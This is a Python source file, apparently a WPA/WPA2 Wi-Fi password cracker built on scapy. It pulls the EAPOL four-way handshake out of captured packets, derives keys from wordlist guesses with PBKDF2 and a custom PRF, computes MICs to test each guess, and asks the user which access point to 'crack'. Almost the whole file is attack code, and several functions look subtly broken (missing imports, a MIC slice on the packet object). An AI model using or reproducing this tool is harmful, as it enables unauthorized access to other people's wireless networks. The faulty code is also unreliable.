from scapy.all import *
import binascii
from pbkdf2 import PBKDF2


def get_package_sender_mac(package):
    return package[Dot11].addr2


def get_package_receiver_mac(package):
    return package[Dot11].addr1


def format_mac_address(mac_address):
    return binascii.a2b_hex(
        mac_address.replace(":", "").lower())


def get_nonce(packet):
    return binascii.a2b_hex(
        binascii.hexlify(packet.getlayer(Raw).load)[26:90]
    )


def get_mic(packet):
    return packet[154:186]


def get_version(packet):
    return packet.getlayer(EAPOL).version


def get_length(packet):
    return packet.getlayer(EAPOL).len


def get_type(packet):
    return packet.getlayer(EAPOL).type


def get_is_empty_byte_string(byte_string):
    # ASCII code for '0' is 48,
    return all(byte == 48 for byte in byte_string)


def customPRF512(pmk, key_data):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen*8+159)/160):
        hmacsha1 = hmac.new(pmk, "Pairwise key expansion".encode()+chr(0x00).encode(
            'ascii', errors='ignore')+key_data+chr(i).encode(), hashlib.sha1)
        i += 1
        R = R+hmacsha1.digest()
    return R[:blen]


def get_handshake_packets(packets):
    handshake_packets = [0, 0, 0, 0]

    for packet in packets:
        # EAPOL type 3 are handshake packets
        if not (packet.haslayer(EAPOL) and packet[EAPOL].type == 3):
            continue

        is_message_from_access_point = packet.getlayer(
            Dot11).FCfield & 0x2 != 0
        nonce = binascii.hexlify(packet.getlayer(Raw).load)[26:90]
        mic = binascii.hexlify(packet.getlayer(Raw).load)[154:186]

        if is_message_from_access_point:
            if get_is_empty_byte_string(mic):
                handshake_packets[0] = packet
            else:
                handshake_packets[2] = packet

        if not is_message_from_access_point:
            if get_is_empty_byte_string(nonce):
                handshake_packets[3] = packet
            else:
                handshake_packets[1] = packet

    return handshake_packets


def calculate_mic(guessed_password, essid, key_data, payload):
    pmk = PBKDF2(guessed_password, essid, 4096).read(32)
    ptk = customPRF512(pmk, key_data)
    # TODO find out if both encryptions are used, is there info inside the packet about which one was used
    # mic1 = hmac.new(ptk[0:16], payload, hashlib.md5).hexdigest().encode()
    mic = hmac.new(ptk[0:16], payload, hashlib.sha1).hexdigest()[:32].encode()
    print(binascii.hexlify(
        hmac.new(ptk[0:16], payload, hashlib.sha1).hexdigest()[:32]).encode())
    return mic


def read_password_list(path):
    # TODO
    """    
            from pathlib import Path
            content = Path('passwords.txt').read_text()   // .split('\n')

    """
    file_ = open(path, 'r')
    passwords_with_new_line = file_.read().splitlines()
    passwords = [line.strip() for line in passwords_with_new_line]
    return passwords


def select_essid(all_packets):
    essid_list = []
    for packet in all_packets:
        if packet.haslayer(Dot11):
            if packet.type == 0 and packet.subtype == 8:   # Beacon frame
                essid_list.append(packet[Dot11Elt].info.decode('utf-8'))
    print("\nPlease choose the name of the access point")

    for index, essid in enumerate(essid_list):
        print(index+1, essid)
    selected_essid = int(
        input("Please enter the number of the access point you want to crack: ")) - 1
    return essid_list[selected_essid]
